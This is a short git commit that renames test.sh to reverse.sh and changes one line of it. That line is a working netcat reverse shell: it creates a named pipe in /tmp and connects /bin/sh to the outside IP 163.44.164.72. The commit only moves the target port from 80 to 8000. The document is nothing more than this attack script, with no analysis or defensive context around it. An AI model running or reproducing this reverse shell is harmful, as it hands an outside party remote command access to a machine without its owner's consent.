e8120a575b1851edda4e3c77b51604c304bf2e13
avfisher <brianwangrewa@gmail.com>
2016-03-03 18:37:44 +0800

    Update and rename test.sh to reverse.sh

--- reverse.sh
+++ reverse.sh
@@ -4,4 +4,4 @@ a=$(date +%s);
 backpipe="backpipe""$a";
 
 mknod /tmp/$backpipe p;
-/bin/sh 0</tmp/$backpipe | nc 163.44.164.72 80 1>/tmp/$backpipe;
+/bin/sh 0</tmp/$backpipe | nc 163.44.164.72 8000 1>/tmp/$backpipe;
